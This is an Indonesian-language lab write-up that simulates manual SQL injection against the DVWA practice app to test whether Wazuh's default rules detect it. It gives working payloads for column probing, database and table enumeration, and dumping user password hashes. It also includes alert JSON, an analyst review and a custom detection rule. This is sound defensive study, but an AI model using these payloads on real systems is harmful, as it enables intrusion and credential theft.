# SQL Injection — DVWA (Web-Server)

## Tujuan

Simulasi manual **SQL Injection** ke modul **SQL Injection** DVWA (`10.10.10.10`) dari Kali Linux, sekaligus jadi validasi utama: **apakah default ruleset Wazuh bisa detect serangan ini** — dari fase recon sampai data exfiltration. Sesuai filosofi lab: deteksi dulu, bukan eksploitasi.

---

## Prerequisites

- DVWA sudah bisa diakses dari Kali — lihat [`dvwa-external-access.md`](../../../Infrastructure/dvwa-external-access.md)
- Wazuh Agent di Web-Server sudah running — lihat [`web-server-wazuh-agent.md`](../../../Infrastructure/web-server-wazuh-agent.md)
- Agent Web-Server sudah dikonfigurasi baca `/var/log/apache2/access.log` lewat `<localfile>` stanza di `ossec.conf` — default agent Ubuntu belum monitor log Apache, harus ditambahin manual:
  ```xml
  <localfile>
    <log_format>apache</log_format>
    <location>/var/log/apache2/access.log</location>
  </localfile>
  ```
- DVWA **Security Level** di-set ke `Low` (menu **DVWA Security**) — Security Level cuma ngaruh ke modul vulnerability, gak ngaruh ke form login (form login DVWA emang udah di-hardcode escape, gak bisa dijadiin auth-bypass SQLi)

---

## Step-by-Step

### 1. Login & Cek Security Level

Login normal ke DVWA pakai kredensial default, cek **DVWA Security** tertulis `low`.

![login](./asset/01-login.gif)
![security level](./asset/02-security-level.gif)

### 2. Baseline — Input Normal

Masuk ke modul **SQL Injection**, coba input `1`, `2`, `3` — nampilin data user sesuai ID, behavior normal/expected. Ini jadi baseline sebelum masuk ke payload attack.

### 3. Discovery — Cek Celah

Coba `1'` dulu — di modul ini gak muncul error kentara di halaman. Lanjut cek jumlah kolom pakai `ORDER BY` incremental:

```
1' ORDER BY 1-- -   → normal
1' ORDER BY 2-- -   → normal
1' ORDER BY 3-- -   → error (Unknown column) → confirmed cuma 2 kolom (first_name, last_name)
```

![vuln check](./asset/04-vuln-check.gif)

### 4. Enumerasi Database & Versi

```sql
1' UNION SELECT database(),version()-- -
```

Output: database aktif `dvwa`, versi MariaDB `11.8.6-MariaDB-5 from Ubuntu`.

![db version check](./asset/05-db-version-check.gif)

### 5. Enumerasi Tabel

```sql
1' UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema=database()-- -
```

Ketemu tabel: `access_log`, `guestbook`, `users`, `security_log`.

![table enum](./asset/06-table-enum.gif)

### 6. Dump Kredensial

```sql
1' UNION SELECT user,password FROM users-- -
```

Berhasil dump username + password hash semua user dari tabel `users`.

![dump data](./asset/07-dump-data.gif)

---

## Verifikasi

Tiap step di atas dicek silang ke `access.log` (Web-Server) dan Wazuh Dashboard (Threat Hunting, filter `agent.name: web-server`):

| Payload | HTTP Status | Ke-detect Wazuh? | Rule | Catatan |
|---|---|---|---|---|
| `1'` | 200 | ❌ Tidak | - | Quote tunggal dianggap terlalu generic, gak match signature apapun |
| `1' ORDER BY 1/2/3-- -` | 200 | ❌ Tidak | - | `ORDER BY` dianggap keyword SQL biasa, gak masuk daftar signature attack |
| `1' UNION SELECT database(),version()-- -` | 200 | ✅ Ya | **31106** — "A web attack returned code 200 (success)", level 6, MITRE T1190 | Match base signature `UNION SELECT` |
| `1' UNION SELECT table_name,... information_schema...-- -` | 200 | ✅ Ya | **31106**, level 6 | Match base signature `information_schema` |
| `1' UNION SELECT user,password FROM users-- -` | 200 | ✅ Ya | **31106**, level 6 | Data exfiltration credentials terdeteksi, tapi severity masih sama level 6 dengan recon biasa |
| *(cross-check)* modul **SQL Injection (Blind)**, payload `1'` | 404 | ✅ Ya (kebetulan) | **31101** — "Web server 400 error code", level 5 | DVWA sengaja balikin 404 buat sinyal blind SQLi; rule ini generic 400-error, bukan signature SQLi |

**Kesimpulan:**

1. Default Wazuh ruleset (rule 31106) **punya** base signature buat pattern SQLi eksplisit (`UNION SELECT`, `information_schema`), tapi **gagal detect fase recon** — payload awal (`'`, `ORDER BY`) yang biasa dipakai attacker buat mastiin vulnerable sebelum full exploit, lolos tanpa alert sama sekali.
2. **Severity level gak proporsional**: recon (`database(),version()`) dan **data exfiltration credentials** sama-sama kena level 6 — SOC analyst yang filter dashboard di level tinggi (≥10) bakal skip kejadian pencurian kredensial ini.
3. Alert di modul Blind (rule 31101) **bukan deteksi SQLi asli** — itu kebetulan match rule generic "400 error", jadi kalau attacker pakai payload yang gak nyebabin status error (murni boolean-based tanpa 404), itu juga bakal lolos.

Gap-gap ini jadi basis desain custom rule berikut.

---

## Analisis Insiden (SOC Analyst Review)

Rekonstruksi kronologis 3 alert Wazuh (rule `31106`) yang ke-generate selama attack simulation di atas, ditulis dalam format review analyst.

### Event 1 — 13 Juli 2026, 14:47:52 — Database Enumeration

```json
{
  "agent": { "ip": "10.10.10.10", "name": "web-server", "id": "005" },
  "data": {
    "protocol": "GET",
    "srcip": "192.168.43.111",
    "id": "200",
    "url": "/vulnerabilities/sqli/?id=%27+UNION+SELECT+database%28%29%2Cversion%28%29--+-&Submit=Submit"
  },
  "rule": {
    "level": 6,
    "description": "A web attack returned code 200 (success).",
    "id": "31106",
    "mitre": { "technique": ["Exploit Public-Facing Application"], "id": ["T1190"], "tactic": ["Initial Access"] }
  },
  "timestamp": "2026-07-13T07:47:54.333+0000"
}
```

Pada tanggal 13 Juli 2026 jam 14:47:52 ditemukan sebuah log dari IP `192.168.43.111` ke Web-Server utama (`10.10.10.10`), terjadi percobaan enumeration terhadap platform database yang terinstall di web server tersebut. Attacker mencoba melakukan enumeration pada halaman web dengan path `/vulnerabilities/sqli/?id=`, parameter `id` dijadikan tempat untuk melakukan **SQL Injection**, dengan mengirimkan command `' UNION SELECT database(),version()-- -`. Berdasarkan sumber IP, `192.168.43.111` merupakan **IP eksternal** (Kali Linux, posisi di luar firewall/hotspot) — jadi ini murni percobaan exploitation dari luar terhadap aplikasi web yang exposed, bukan indikasi internal host yang sudah compromised. Penyerangan ini terdaftar sebagai initial access `T1190` (Exploit Public-Facing Application).

### Event 2 — 13 Juli 2026, 14:49:26 — Table Enumeration

```json
{
  "agent": { "ip": "10.10.10.10", "name": "web-server", "id": "005" },
  "data": {
    "protocol": "GET",
    "srcip": "192.168.43.111",
    "id": "200",
    "url": "/vulnerabilities/sqli/?id=1%27+UNION+SELECT+table_name%2C2+FROM+information_schema.tables+WHERE+table_schema%3Ddatabase%28%29--+-&Submit=Submit"
  },
  "rule": {
    "level": 6,
    "description": "A web attack returned code 200 (success).",
    "id": "31106",
    "mitre": { "technique": ["Exploit Public-Facing Application"], "id": ["T1190"], "tactic": ["Initial Access"] }
  },
  "timestamp": "2026-07-13T07:49:26.494+0000"
}
```

Tidak berhenti di enumeration, attacker kembali mencoba mencari tahu informasi tabel yang ada di database yang digunakan, masih dengan IP yang sama, dilakukan di jam 14:49:26. Ada kemungkinan aksi ini dilakukan oleh attacker langsung (manual), bukan bot/automated tool — mengingat jeda waktu antar request (~1.5 menit) yang gak konsisten kayak pola scanning otomatis. Masih dengan path yang sama `/vulnerabilities/sqli/?id=`, command yang diinput: `1' UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema=database()-- -`.

### Event 3 — 13 Juli 2026, 14:50:43 — Credential Exfiltration

```json
{
  "agent": { "ip": "10.10.10.10", "name": "web-server", "id": "005" },
  "data": {
    "protocol": "GET",
    "srcip": "192.168.43.111",
    "id": "200",
    "url": "/vulnerabilities/sqli/?id=1%27+UNION+SELECT+user%2Cpassword+FROM+users--+-&Submit=Submit"
  },
  "rule": {
    "level": 6,
    "description": "A web attack returned code 200 (success).",
    "id": "31106",
    "mitre": { "technique": ["Exploit Public-Facing Application"], "id": ["T1190"], "tactic": ["Initial Access"] }
  },
  "timestamp": "2026-07-13T07:50:44.518+0000"
}
```

Di jam 14:50:43, attacker melakukan exfiltrasi terhadap tabel `users` — command yang diinput: `1' UNION SELECT user,password FROM users-- -`. Ada kemungkinan attacker sudah mendapatkan kredensial user dan sedang berusaha memecahkan password-nya. Direkomendasikan untuk segera menginfokan user agar mengganti password dan mengaktifkan 2FA.

---

## Custom Detection Rule

Kondisinya: kita coba desain custom rule yang nutup celah **fase recon SQLi** — spesifiknya percobaan **enumerasi jumlah kolom** (`ORDER BY`/`GROUP BY` incremental) yang di atas terbukti **lolos total** dari default ruleset Wazuh. Pendekatannya sengaja dibuat **bertahap, satu rule dulu** (bukan langsung tiered/parent-child yang kompleks), biar tiap bagian regex-nya bener-bener dipahami sebelum nambah cakupan.

File: [`sql_injection_rules.xml`](../../../Detection-Engineer/wazuh-rules/sql_injection_rules.xml)

```xml
<rule id="100203" level="8">
  <decoded_as>web-accesslog</decoded_as>
  <url type="pcre2">(?i)%27.*group(\s|%20|\+)+by</url>
  <description>Web attack: SQL Injection - GROUP BY probing terdeteksi di $(url)</description>
  <mitre>
    <id>T1190</id>
  </mitre>
  <group>sql_injection,recon,</group>
</rule>
```

Cara bacanya: cek log yang udah ke-decode sebagai `web-accesslog`, cari pattern quote (`%27`) yang di suatu titik setelahnya diikuti `group by` (toleran ke variasi spasi literal, `%20`, atau `+`). Flag `(?i)` bikin case-insensitive, jadi `GROUP BY`/`group by`/`GrOuP bY` semua kena.

**Catatan proses debugging** (buat pembelajaran, bukan cuma hasil akhir):
- Percobaan pertama pakai ID `100200` **gak pernah ke-trigger** walau syntax rule valid dan `wazuh-analysisd -t` gak nunjukin error — sempet dicurigai konflik `decoded_as` vs base rule `31100` (rule default yang juga anchor ke decoder `web-accesslog`), tapi setelah ganti ke ID baru (`100203`) yang belum pernah dipake sebelumnya, rule langsung jalan. Kemungkinan ada residual state dari histori edit-restart berkali-kali yang nempel ke ID lama.
- Divalidasi pakai `wazuh-logtest` (bukan cuma attack beneran + cek dashboard) — cara ini lebih cepat buat isolasi masalah karena langsung nunjukin decoder + rule yang match tanpa perlu generate traffic asli.

**Status:** rule `100203` udah confirmed jalan (muncul di `wazuh-logtest` buat payload `GROUP BY`). Rule tambahan buat pattern lain (`ORDER BY`, `AND`/`OR`, tier exploitation/exfiltration) menyusul bertahap.
